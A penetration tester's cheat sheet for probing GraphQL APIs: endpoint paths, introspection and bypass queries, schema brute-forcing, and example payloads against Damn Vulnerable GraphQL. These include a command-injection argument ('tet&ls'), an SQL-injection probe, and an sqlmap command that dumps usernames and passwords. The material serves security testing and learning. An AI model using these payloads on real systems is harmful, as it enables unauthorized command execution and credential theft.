##Common Endpoint Paths:
	•	/graphql
	•	/api
	•	/api/graphql
	•	/graphql/api
	•	/graphql/graphql
	•	/graphiql
	•	graphql.php
	•	/graphql/console


##Burp Custom Columns: 
String q = requestResponse.request().parameterValue("query", HttpParameterType.JSON);
if (q != null) {
   return q.split("\\{|\\(")[0];
}
return "";


##Check for IntroSpection:
"query": "{__schema{types{name}}}"

##Dump whole schema: 
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}

##Do this via InQL:
Send to InQL from proxy

##IntroSpection disabled Bypasses:
	1.	Bypass IntroSpection Regex:
Just add an extra character after scheme like a newline,  space, comma
{ "query": "query{__schema {queryType{name}}}" }

	2.	Bypass Via changing from POST to GET:


##BruteForcing suggestions to get the Schema:
If suggestions are turned on in the responses you can use credential stuffing by just stuffing a bunch of possible fields into queries and parsing out the suggestions.. Or you can automate this with tools: 

##Clairvoyance Bruteforce: 
clairvoyance <URL/graphql> -w <dictionaryFile> -o Clairavoyance_Schema_output.json
##Manually Using suggestions: 
	•	Find a query in your Burp output to GraphQl which has data but seems like other fields may be possible
	•	Review the UI to see what data is coming back there as well and make some assumptions
	•	Modify the query by stuffing new fields into the query and looking for suggestions that might indicate other fields that are available 

##Graphing with Voyager:
https://graphql-kit.com/graphql-voyager/

Click change schema -> Introspection tab -> paste your introspection Schema output

##Things to look for:
Use the search feature at the left to search for sensitive fields 
Review graphs for connections between various data endpoints
Review graphs for potential circular DOS
Also review the type lists for arguments and usage


##Manual requests for sensitive data discover: 
Review and search the schema and voyager for possible sensitive fields
Grab an existing query from Burp and try to query it (also try searching burp for that data query!!)
If using InQUL check the graphQL tab for easier editing


##Review Queries Available:
{"query":"{__schema{queryType {fields{ name }}}}"}

##Review Mutations available: 
{"query":"{__schema{mutationType {name kind fields{name description}}}}"}

##Review available subscriptions: 
{"query":"{__schema{subscriptionType {fields{ name }}}}"}

##Example from Damn Vulnerable (Calling user data):
query users {
        users{
          id
          username
          password
            
          }
          } 

##Querying data through multiple data releationships: 
{"query":"query pastes {pastes {owner{name}}}"}


##Example of CMD Injection: 

{"query": "query {\n    systemDebug(arg: \"tet&ls\")\n}"}


##Example of SQLi: 
{"query":"query{ pastes(filter:\"test'\"){title}}"}

#Running SQL Map to find SQLI
sqlmap -r request.txt --dbms=sqlite --tables --sql-shell --threads 10
select username, password from users


##Audit with GraphQL Cop: 
graphql-cop -t <graphql_URL>
